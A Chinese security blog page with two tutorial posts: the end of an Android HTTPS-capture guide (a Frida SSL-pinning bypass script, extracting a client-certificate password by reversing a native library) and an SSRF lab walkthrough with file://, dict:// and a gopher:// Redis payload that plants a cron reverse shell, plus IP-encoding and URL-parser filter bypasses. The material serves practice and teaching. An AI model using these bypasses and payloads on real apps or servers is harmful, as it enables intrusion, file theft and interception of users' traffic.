<p>新建一个frida-android-repinning.js文件, 详细代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function()&#123;</span><br><span class="line">    Java.perform(function ()&#123;</span><br><span class="line">    	console.log(&quot;&quot;);</span><br><span class="line">	    console.log(&quot;[.] Cert Pinning Bypass/Re-Pinning&quot;);</span><br><span class="line"></span><br><span class="line">	    var CertificateFactory = Java.use(&quot;java.security.cert.CertificateFactory&quot;);</span><br><span class="line">	    var FileInputStream = Java.use(&quot;java.io.FileInputStream&quot;);</span><br><span class="line">	    var BufferedInputStream = Java.use(&quot;java.io.BufferedInputStream&quot;);</span><br><span class="line">	    var X509Certificate = Java.use(&quot;java.security.cert.X509Certificate&quot;);</span><br><span class="line">	    var KeyStore = Java.use(&quot;java.security.KeyStore&quot;);</span><br><span class="line">	    var TrustManagerFactory = Java.use(&quot;javax.net.ssl.TrustManagerFactory&quot;);</span><br><span class="line">	    var SSLContext = Java.use(&quot;javax.net.ssl.SSLContext&quot;);</span><br><span class="line"></span><br><span class="line">	    // Load CAs from an InputStream</span><br><span class="line">	    console.log(&quot;[+] Loading our CA...&quot;)</span><br><span class="line">	    var cf = CertificateFactory.getInstance(&quot;X.509&quot;);</span><br><span class="line">	    </span><br><span class="line">	    try &#123;</span><br><span class="line">	    	var fileInputStream = FileInputStream.$new(&quot;/data/local/tmp/cert-der.crt&quot;);</span><br><span class="line">	    &#125;</span><br><span class="line">	    catch(err) &#123;</span><br><span class="line">	    	console.log(&quot;[o] &quot; + err);</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    var bufferedInputStream = BufferedInputStream.$new(fileInputStream);</span><br><span class="line">	  	var ca = cf.generateCertificate(bufferedInputStream);</span><br><span class="line">	    bufferedInputStream.close();</span><br><span class="line"></span><br><span class="line">		var certInfo = Java.cast(ca, X509Certificate);</span><br><span class="line">	    console.log(&quot;[o] Our CA Info: &quot; + certInfo.getSubjectDN());</span><br><span class="line"></span><br><span class="line">	    // Create a KeyStore containing our trusted CAs</span><br><span class="line">	    console.log(&quot;[+] Creating a KeyStore for our CA...&quot;);</span><br><span class="line">	    var keyStoreType = KeyStore.getDefaultType();</span><br><span class="line">	    var keyStore = KeyStore.getInstance(keyStoreType);</span><br><span class="line">	    keyStore.load(null, null);</span><br><span class="line">	    keyStore.setCertificateEntry(&quot;ca&quot;, ca);</span><br><span class="line">	    </span><br><span class="line">	    // Create a TrustManager that trusts the CAs in our KeyStore</span><br><span class="line">	    console.log(&quot;[+] Creating a TrustManager that trusts the CA in our KeyStore...&quot;);</span><br><span class="line">	    var tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();</span><br><span class="line">	    var tmf = TrustManagerFactory.getInstance(tmfAlgorithm);</span><br><span class="line">	    tmf.init(keyStore);</span><br><span class="line">	    console.log(&quot;[+] Our TrustManager is ready...&quot;);</span><br><span class="line"></span><br><span class="line">	    console.log(&quot;[+] Hijacking SSLContext methods now...&quot;)</span><br><span class="line">	    console.log(&quot;[-] Waiting for the app to invoke SSLContext.init()...&quot;)</span><br><span class="line"></span><br><span class="line">	   	SSLContext.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).implementation = function(a,b,c) &#123;</span><br><span class="line">	   		console.log(&quot;[o] App invoked javax.net.ssl.SSLContext.init...&quot;);</span><br><span class="line">	   		SSLContext.init.overload(&quot;[Ljavax.net.ssl.KeyManager;&quot;, &quot;[Ljavax.net.ssl.TrustManager;&quot;, &quot;java.security.SecureRandom&quot;).call(this, a, tmf.getTrustManagers(), c);</span><br><span class="line">	   		console.log(&quot;[+] SSLContext initialized with our custom TrustManager!&quot;);</span><br><span class="line">	   	&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,0);</span><br></pre></td></tr></table></figure></p>
<p>在cmd, 输入如下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt</span><br><span class="line">$ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause</span><br></pre></td></tr></table></figure></p>
<p>在关闭应用的情况下(避免Magisk Hide处于开启状态), 可得到回显并绕过SSL pinning。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572486642/M_1_EUWZ_6_CO2SM09_3DTP_ue6fyd.png" alt></p>
<h3 id="绕过SSL双向校验"><a href="#绕过SSL双向校验" class="headerlink" title="绕过SSL双向校验"></a>绕过SSL双向校验</h3><p>其实SSL双向校验是在SSL单向校验的基础上, 在说明这部分内容的时候同时也会有绕过SSL单向校验详细的步骤。参考文章<a href="https://juejin.im/post/5cc313755188252d6f11b463#heading-14" target="_blank" rel="noopener">Android平台HTTPS抓包解决方案及问题分析</a>, 我们可以先用sxxl.app来练练手。</p>
<p>在手机上设置完代理之后, 点击完确认, 发现app出现如下弹窗：</p>
<p><img src="https://uploader.shimo.im/f/T4lkr2dfT64GsoGS.png!thumbnail" alt></p>
<p>在这个时候查看Fiddler会发现应用没有发出任何请求, 这是因为app会对服务器端的证书进行校验, 这时候我们前面安装的Fiddler证书就不起作用了, 应用在发现证书是伪造的情况下拒绝发送请求。根据这个报错+抓不到包, 我们可以确定应用是存在单向校验的, 也就是SSL pinning, 让我们先来解决SSL pinning的问题。使用JustTrustMe可以绕过客户端的证书校验, 下面勾选上JustTrustMe, 在Xposed框架下使用JustTrustMe绕过SSL pinning。</p>
<p><img src="https://uploader.shimo.im/f/UPkqz9e37SE4Xaru.png!thumbnail" alt></p>
<p>绕过SSL pinning之后, 就能使用Fiddler抓取到HTTPS的数据包了。</p>
<p><img src="https://uploader.shimo.im/f/KwSgy60dfJcbQMM1.png!thumbnail" alt></p>
<p>我随便输入了一个手机号码, 按下确定之后, 服务器回传了400的状态码过来, 说需要发送证书以确认客户端的身份。到这一步基本能确定是存在双向校验的了, 接下来的工作就是绕过SSL服务器端的校验了。</p>
<p><img src="https://uploader.shimo.im/f/nwwxTjE5olYSkSwi.png!thumbnail" alt></p>
<p>如果服务器端会对客户端证书进行校验, 证书应该就直接存放在apk里, 网上与SSL双向校验相关的文章都将证书放到<code>&lt;app&gt;/asset</code>目录下, 也就是app的资源目录下, 也有可能放在<code>/res/raw</code>目录下。直接将app解压之后, 发现证书的位置如下：</p>
<p><img src="https://uploader.shimo.im/f/CtqP7d0fS4wjbr9I.png!thumbnail" alt></p>
<p>如果找半天没找到就用关键词<code>.p12/.pfx</code>搜索证书文件。</p>
<p>在我们要使用该证书的时候, 需要输入安装证书的密码。这时候就需要从源码中获取安装证书的密码了。可能是因为多个dex文件的原因, 直接用JEB反编译的时候出错了, 所以我用GDA反编译来分析应用的源代码</p>
<h3 id="获取安装证书的密码"><a href="#获取安装证书的密码" class="headerlink" title="获取安装证书的密码"></a>获取安装证书的密码</h3><p>发现通过关键词”PKCS12”能够定位到加载证书的位置。</p>
<p><img src="https://uploader.shimo.im/f/cDmjJ9Saj7QOuMPj.png!thumbnail" alt></p>
<p>上图第二个红框中的load函数的第二个参数其实就是证书的密钥, 追根溯源, 我们可以知道v1参数是下图中调用的函数的返回值。</p>
<p><img src="https://uploader.shimo.im/f/W1FO2Ksc7o0iQLav.png!thumbnail" alt></p>
<p><img src="https://uploader.shimo.im/f/xgSd7HinNxEFom6X.png!thumbnail" alt></p>
<p>上图的函数的功能就是传递p0参数, 也就是说p0参数就是证书安装密码。想获取这个密码, 关键在于Auto_getValue函数。到这一步, 只要跟进Null_getStorePassword函数看看就好了。</p>
<p><img src="https://uploader.shimo.im/f/br5qyHIOEE0K1VTV.png!thumbnail" alt></p>
<p>跟进去发现调用了native层的函数, 查看init函数中具体加载的是哪个so文件：</p>
<p><img src="https://uploader.shimo.im/f/Z0FUAIiTgggcHRh6.png!thumbnail" alt></p>
<p>用IDA反编译soul-netsdk之后, 搜索字符串”getStorePassword”, 就定位到函数getStorePassword上了, F5之后, 获得伪代码和密钥：</p>
<p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1570862584/ND0HGHRQSXYF0_4_ZGOVH_S_xsuhlc.png" alt></p>
<h3 id="代理添加客户端证书"><a href="#代理添加客户端证书" class="headerlink" title="代理添加客户端证书"></a>代理添加客户端证书</h3><p>HttpCanary添加客户端证书进行抓包的过程可以参照文章<a href="https://juejin.im/post/5cc313755188252d6f11b463" target="_blank" rel="noopener">Android平台HTTPS抓包解决方案及问题分析</a>, 在自己头昏的时候也感谢这篇文章的作者MegatronKing点醒我。下面主要讲解Fiddler和burpsuite添加客户端证书的方法。</p>
<h4 id="fiddler操作过程"><a href="#fiddler操作过程" class="headerlink" title="fiddler操作过程"></a>fiddler操作过程</h4><p>尝试一下用Fiddler处理这部分的内容来安装客户端的证书, 用来绕过双向认证。</p>
<p><img src="https://uploader.shimo.im/f/BA9URi7xMhU1YpJZ.png!thumbnail" alt></p>
<p>用Fiddler抓取该应用的数据包的时候, 发现Fiddler出现了上面的弹窗, 提示要添加ClientCertificate.cer, 才能抓取到传输的数据包, 不然只会出现400的状态码。而我们文件目录下只能找到<code>client.p12</code>和<code>client.crt</code>两种格式的证书文件, 所以我们需要将已有的client证书转换成<code>.cer</code>格式的证书。</p>
<p><img src="https://uploader.shimo.im/f/bnnR07VNGrkkYp8e.png!thumbnail" alt></p>
<p>好像应用中只出现<code>.p12</code>格式的证书的情况比较常见, 所以下面只会提及如何使用openssl将<code>.p12</code>格式的证书转换成<code>.cer/.der</code>格式的证书。(.der和.cer格式的证书仅有文件头和文件尾不同)</p>
<p>下面的命令实现了证书的格式转换, <code>.p12</code>-&gt;<code>.pem</code>-&gt;<code>.cer</code>, 在生成<code>.pem</code>格式的证书之后, 需要输入证书的密码, 也就是我们上面逆向获取的证书密码。最后将<code>ClientCertificate.cer</code>移动到之前Fiddler弹窗出现的目录下, 也就是<code>&lt;Fiddler安装路径&gt;\Fiddler2</code>下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 将.p12证书转换成.pem格式</span><br><span class="line">$ openssl pkcs12 -in client.p12 -out ClientCertificate.pem -nodes</span><br><span class="line">Enter Import Password:</span><br><span class="line"># 将.pem证书转换成.cer格式</span><br><span class="line">$ x509 -outform der -in ClientCertificate.pem -out ClientCertificate.cer</span><br></pre></td></tr></table></figure>
<p>现在打开Fiddler尝试抓包, 发现原本显示400的数据包现在能够正常抓取到了, 如果还是不能正常抓取到, 双击<code>client.p12</code>将证书安装到本地试试看。<br><img src="https://uploader.shimo.im/f/zxLh4rfh1QgxsjpV.jpg!thumbnail" alt></p>
<h4 id="burp操作过程"><a href="#burp操作过程" class="headerlink" title="burp操作过程"></a>burp操作过程</h4><p>手机的burpsuite证书安装成功之后, 我们会发现只能抓取到400的状态码。</p>
<p><img src="https://uploader.shimo.im/f/yRSl5MMwMaslgxiK.png!thumbnail" alt></p>
<p>因为要绕过服务器端对证书的验证, 我们还需要在这里添加上面我们在asset目录下找到的证书。</p>
<p><img src="https://uploader.shimo.im/f/RMgh5cCQ5NY8JmI4.png!thumbnail" alt></p>
<p><img src="https://uploader.shimo.im/f/WKtrjYYS5l0TTp0D.png!thumbnail" alt></p>
<p>安装完就能正常抓取数据包了。</p>
<h2 id="抓取TCP的数据包"><a href="#抓取TCP的数据包" class="headerlink" title="抓取TCP的数据包"></a>抓取TCP的数据包</h2><p>现在还不知道怎么能够获取TCP的数据包并对其中的内容进行解密, 不过之前在看雪上看到一篇分析使用TCP传输协议的文章<a href="https://bbs.pediy.com/thread-251063.htm" target="_blank" rel="noopener">某直播APP逆向TCP协议分析</a>, 我大概看了一下, 文章是从逆向的角度分析的, 具体怎么从渗透的角度发现是TCP协议传输的数据包还没有分析过, 看作者使用了wireshark抓取应用的数据包并进行分析, 这个还是要重新分析一下的。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>文章最后, 还要感谢华华师傅, 其实实习的时候接触android的时间也不长, 但是之后真的让我接触到很多和学到很多, 也谢谢师傅能耐心地帮我解答问题, 感恩。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2019/10/12/Android抓包总结/" data-id="ckrzo1bj40005dfrt3a6tnfvh" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android-渗透/">Android 渗透</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SSRF-LABS指南" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/05/19/SSRF-LABS指南/" class="article-date">
  <time datetime="2019-05-19T22:09:29.000Z" itemprop="datePublished">2019-05-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/19/SSRF-LABS指南/">SSRF-LABS指南</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="SSRF-LABS指南"><a href="#SSRF-LABS指南" class="headerlink" title="SSRF-LABS指南"></a>SSRF-LABS指南</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在网上找到一个学习SSRF的环境，<a href="https://github.com/m6a-UdS/ssrf-lab/blob/master/basics/www/testhook.php" target="_blank" rel="noopener">SSRF-LABS</a>有一个好看又简洁的界面，提供了最基本的<a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="noopener">REST API</a>和客户端WebHook功能用于SSRF测试。前面只是大概的介绍，知道就好，不用花费过多精力了解。</p>
<h3 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h3><p>服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完整的攻击链。<br><img src="https://user-gold-cdn.xitu.io/2017/8/7/a89839b837b0c4e897a77445f9615482?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt></p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>我的环境是Ubuntu16.04，如果使用其他的系统，可能安装docker的方法不同，可以到网上搜一下。下面为安装docker的步骤。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sSL https://get.docker.com/ | sh #脚本安装docker</span><br><span class="line">$ apt install docker-compose #安装docker compose</span><br></pre></td></tr></table></figure></p>
<p>先按照下面的命令把<code>basic</code>这一关搭建好，其他的基本相同。在创建容器的时候避免出冲突，端口<code>8999</code>在设置要注意，避免与本地已开启端口产生冲突。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/m6a-UdS/ssrf-lab.git</span><br><span class="line">$ cd ~/ssrf-lab/basics #进入basics文件夹</span><br><span class="line">$ docker build -t ssrf-lab/basic . #构建镜像</span><br><span class="line">$ docker run -d -p 8999:80 ssrf-lab/basic #创建容器</span><br><span class="line">$ docker ps #查看ssrf-lab/basic容器编号</span><br><span class="line">$ docker stop [容器编号] #关闭容器</span><br></pre></td></tr></table></figure></p>
<p>在Advances系列的文件夹还有ctf中没有<code>dockerfile</code>文件，只有<code>docker-compose.yml</code>文件，这时候我们就要在构建镜像的时候就换<code>docker-compose</code>来创建镜像并开启容器了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/ssrf-lab/advanced1 # 进入advanced1目录下</span><br><span class="line">$ docker-compose up -d #开启容器</span><br><span class="line">$ docker-compose down #关闭容器</span><br></pre></td></tr></table></figure></p>
<p>在开启容器的时候的时候出了问题，因为在官网找不到urllib2的下载路径，编辑<code>~/ssrf-lab/advanced2/flask-webserver</code>文件，去掉其中的urllib2。</p>
<h3 id="Part-1：basic"><a href="#Part-1：basic" class="headerlink" title="Part 1：basic"></a>Part 1：basic</h3><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><p>打开页面，OUTGOING WEBHOOK部分输入的<em><a href="https://yourhandler.io/events" target="_blank" rel="noopener">https://yourhandler.io/events</a></em>是有REST API监听的需要测试项目，在SEE THE RESULT的部分会显示请求响应的结果和状态码。输入<em><a href="https://yourhandler.io/events" target="_blank" rel="noopener">https://yourhandler.io/events</a></em>的位置就可以作为一个测试点。</p>
<p>我们先用<code>http://127.0.0.1</code>进行测试。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557629899/SSRF/1557629749_1.png" alt><br>发现数据显示出来了，说明这里没有对内网IP进行限制。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557630022/SSRF/1557630002_1.png" alt></p>
<p>为了进一步进行测试，我们来了解一下URL的结构。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://user:pass@host:port/path?query=value#fragment</span><br></pre></td></tr></table></figure></p>
<p>从结构中我们可以看出不同的SSRF的利用姿势，有协议、URL绕过等等。这一关就尝试从协议入手，用file协议代替http协议或者https协议。在测试点输入<code>file:///etc/passwd</code>我们可以得到用户文件，我们也可以通过这样的方式获得其他文件。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557647222/SSRF/1557647189.png" alt><br>成功之后我们可以通过深挖配置文件和源代码进行我们进一步的渗透，比如获得数据库的用户凭证。这里成功实现是因为URL没有经过严格的过滤，更准确地说应该是完全没经过过滤，下一关不会这么简单了。</p>
<h4 id="SSRF协议中的利用"><a href="#SSRF协议中的利用" class="headerlink" title="SSRF协议中的利用"></a>SSRF协议中的利用</h4><p>看了很多教程都是结合Redis服务一起讲的，为了方便介绍下面几个协议，我们先在ssrf-basics容器里面安装该服务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps #查看容器编号</span><br><span class="line">$ docker exec -it [ssrf-lab/basics容器编号] /bin/bash #进入容器</span><br><span class="line">$ apt-get install redis-server # 安装redis服务</span><br><span class="line">$ redis-server #开启redis服务</span><br></pre></td></tr></table></figure>
<p>这一关可以利用协议收集信息及反弹shell，都是没用协议白名单的锅，导致多个协议利用起来毫无阻力。</p>
<h5 id="file"><a href="#file" class="headerlink" title="file"></a>file</h5><p>上面尝试的过的<code>file:///etc/passwd</code>就是利用了file协议，利用这个协议可以读取主机内任意文件。</p>
<h5 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h5><p>利用dict协议，<code>dict://127.0.0.1:6379/info</code>可获取本地redis服务配置信息。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558146811/SSRF/1558146771_1.png" alt></p>
<p>还可以用<code>dict://127.0.0.1:6379/KEYS *</code>获取redis存储的内容<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558175937/SSRF/1558175907_1.png" alt></p>
<h5 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h5><p>通过Gopher协议可以反弹shell，下面为具体的exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure></p>
<p>这个看起来不太清晰，urldecode之后，就可以看到具体的命令。下面为解码之后的内容，我把关键的redis指令放到同一行中。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179482/SSRF/1558179454_1.png" alt></p>
<p>在页面能看到如下的回显<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179650/SSRF/1558179636_1.png" alt></p>
<p>为了验证是否成功了，我在ssrf-lab/basics容器里面查看插入的KEY值。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1558179482/SSRF/1558179319_1.png" alt></p>
<h3 id="Part-2：Advance1"><a href="#Part-2：Advance1" class="headerlink" title="Part 2：Advance1"></a>Part 2：Advance1</h3><h4 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h4><p>这一关用了正则表达式限制内网IP的访问，具体的代码如下。必须要吐槽一下，这个方法真的是一个很糟糕的方法，因为它实际上不能起到很好的安全防护作用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;#^https?://#i&apos;, $handler) !== 1) &#123;  </span><br><span class="line">    echo &quot;Wrong scheme! You can only use http or https!&quot;;  </span><br><span class="line">    die();</span><br><span class="line">&#125; else if (preg_match(&apos;#^https?://10.0.0.3#i&apos;, $handler) === 1) &#123;  </span><br><span class="line">    echo &quot;Restricted area!&quot;;  </span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>现在我们就用<code>http://10.0.0.3</code>来测试<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557661100/SSRF/1557661064_1.png" alt></p>
<p>我们可以很明显地看到没有获得响应，但是神奇的IP地址有多种表达方式，我们可以用这些方式来绕过上面那么直白的限制。先用整数表达<code>http://167772163</code>发出请求。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557673405/SSRF/1557673345_1.png" alt><br>成功了，我们可以来看看IP地址的表达方式。众所周知，IP地址是由四个字节组成的，一旦包含了小数点，就必须考虑到大小端表示，因为这个会影响IP地址的解析。不过好在所有的网络地址都是大端表示法，只需要注意这一点即可，下面我们介绍IP地址的表达方式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字符串:       10.0.0.3</span><br><span class="line">二进制:       00001010 . 00000000 . 00000000 . 00000011</span><br><span class="line">十六进制:    0A.00.00.03</span><br><span class="line">整数:           167772163</span><br></pre></td></tr></table></figure></p>
<p>这些表达方式都能被<code>curl</code>命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用16进制<code>0x0A000003</code>表示IP地址，还有一个很少人知道的绕过小姿势，就是用8进制代替10进制来表示IP地址。在计算机的世界里，一旦在<code>20</code>前面加个<code>0</code>就会变成8进制，比如<code>http://01200000003</code>实际上还是<code>http://10.0.0.3</code>。上面两个表达方式，PHP的curl模块能解析出来。</p>
<p>下面总结一下几种变形<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">十六进制：   http://0x0A.0x00.0x00.0x03</span><br><span class="line">八进制：       http://012.00.00.03</span><br><span class="line">八进制溢出：http://265.0.0.3</span><br></pre></td></tr></table></figure></p>
<p>最后一个变形好像只适用于NodeJS应用的服务器，点分十进制的最大值为255，一旦超出了这个数，将会被重置，这个时候最后一个变形就会变回<code>http://10.0.0.3</code>。具体为什么可以通过这样的可能要从TCP/IP解析IP地址的逻辑入手(应用层的限制总能被巧妙地绕过，不是很可靠)。</p>
<h4 id="其他常见的绕过方法"><a href="#其他常见的绕过方法" class="headerlink" title="其他常见的绕过方法"></a>其他常见的绕过方法</h4><h5 id="DNS泛域名"><a href="#DNS泛域名" class="headerlink" title="DNS泛域名"></a>DNS泛域名</h5><p><code>xip.io</code>和<code>xip.name</code>这两个dns泛域名，实现绕过的方法是，你在你想访问的ip地址后面添加这两个泛域名，这两个域名会从你发出的请求中提取你真正想访问的IP地址，然后再响应报文中返回。感兴趣的可以看看<a href="https://blog.51cto.com/laoxu/1282773" target="_blank" rel="noopener">DNS服务系列之一：泛域名解析的安全案例</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.10.0.0.3.xip.io</span><br><span class="line">http://mysite.10.0.0.3.xip.io</span><br><span class="line">http://foo.bar.10.0.0.3.xip.io</span><br><span class="line">http://foo.10.0.0.3.xip.name</span><br><span class="line">http://www.10.0.0.3.xip.name</span><br></pre></td></tr></table></figure></p>
<p>还有很多其他的绕过方式，因为在这个环境里不能实现，所以就不在这里补充了，<a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="noopener">SSRF漏洞的利用与学习</a>一文中比较全面。没有仔细研究过为什么Python写的后端代码不能实现其他绕过，不过我猜是因为Python的urllib和PHP的curl解析方式不同，如果以后有机会，会深究一下里面到底有什么不同。</p>
<h3 id="Part-2：Advance2"><a href="#Part-2：Advance2" class="headerlink" title="Part 2：Advance2"></a>Part 2：Advance2</h3><p>在安装这个环境的时候，一定要注意端口的配置，如果出现了<code>ERROR: Pool overlaps with other one on this address space</code>的报错，可以按照<a href="http://www.zizhixiaoshe.com/article/21.html" target="_blank" rel="noopener">移除docker网络</a>这篇文章进行操作，记得先将docker给关掉。如果之后还有方法可以避免产生这个报错，例如正确地修改配置文件之类的，我会补充在后面。已经尝试过更改<code>docker-compose.yml</code>文件中的端口不起作用了。</p>
<p>这一关为了避免和上一关一样，代码中没有自己实现IP解析的功能，而是选择调用python2.7自带的库函数解析IP地址，具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url=request.form[&apos;handler&apos;]</span><br><span class="line">host = urlparse.urlparse(url).hostname</span><br><span class="line">if host == &apos;secret.corp&apos;:    </span><br><span class="line">    return &apos;Restricted Area!&apos;</span><br><span class="line">else:    </span><br><span class="line">return urllib.urlopen(url).read()</span><br></pre></td></tr></table></figure></p>
<p>上面的代码用了python2.7中的urlparse模块来解析url，该模块能够解析多个协议。获取了url中host参数之后，再对域进行判断。</p>
<p>跟第一个环境一样，我们先用<code>http://secret.corp</code>来测试。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557816882/SSRF/1557816857_1.png" alt></p>
<p>URL解析器分析出这部分内容是访问已被限制的域，下面要介绍一个新的知识点了，我们先来测试一下它能不能起作用。在测试点输入<code>http://google.com# @secret.corp</code><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1557820423/SSRF/1557820402_1.png" alt></p>
<p>绕过这个到底是基于什么原理呢？让我们再次回顾一下url的结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://user:pass@host:port/path?query=value#fragment</span><br></pre></td></tr></table></figure></p>
